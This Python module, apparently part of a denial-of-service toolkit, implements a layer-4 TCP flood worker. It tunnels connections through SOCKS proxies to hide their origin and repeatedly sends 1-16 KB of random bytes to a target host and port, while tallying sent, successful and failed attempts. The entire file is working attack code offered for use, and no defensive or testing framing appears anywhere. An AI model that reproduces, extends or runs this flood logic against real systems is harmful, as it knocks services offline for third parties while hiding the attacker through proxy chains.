# language: Python 3.10+, file: Module/tcp_flood.py
# *Layer-4 TCP flood -- python-socks SOCKS tunnel + random binary payload*
# entry: tcp_worker(host, port, proxy, rounds)
# deps: pip install python-socks

import asyncio, os, random
from Module.state import stats, slock, stop

async def tcp_worker(host: str, port: int, proxy: dict, rounds: int) -> None:
    """
    Each call connects through a SOCKS proxy, writes *rounds* payloads of
    1–16 KB random bytes.  CancelledError MUST re-raise -- swallowing it
    turns in-flight wait_for() into zombie tasks that prevent loop shutdown.
    """
    from python_socks.async_.asyncio import Proxy as SocksProxy

    pt = proxy.get("protocol", "http").lower()
    if pt not in ("socks4", "socks5"):
        # *HTTP proxies can't tunnel raw TCP -- skip silently*
        return

    proxy_url = f"{pt}://{proxy['ip']}:{proxy['port']}"

    for _ in range(rounds):
        if stop[0]:
            break
        wr = None
        try:
            p    = SocksProxy.from_url(proxy_url)
            # wait_for wraps the SOCKS connect so CancelledError unwinds cleanly
            sock = await asyncio.wait_for(
                p.connect(dest_host=host, dest_port=port),
                timeout=2.0,
            )
            reader, wr = await asyncio.open_connection(sock=sock)
            payload = os.urandom(random.randint(1024, 16384))
            wr.write(payload)
            await wr.drain()
            wr.close()
            await wr.wait_closed()
            with slock:
                stats["sent"]       += 1
                stats["success"]    += 1
                stats["bytes_sent"] += len(payload)
        except asyncio.CancelledError:
            raise   # propagate -- asyncio.gather needs this to cancel correctly
        except Exception:
            with slock:
                stats["sent"] += 1
                stats["fail"] += 1
        finally:
            if wr:
                try:
                    wr.close()
                except Exception:
                    pass
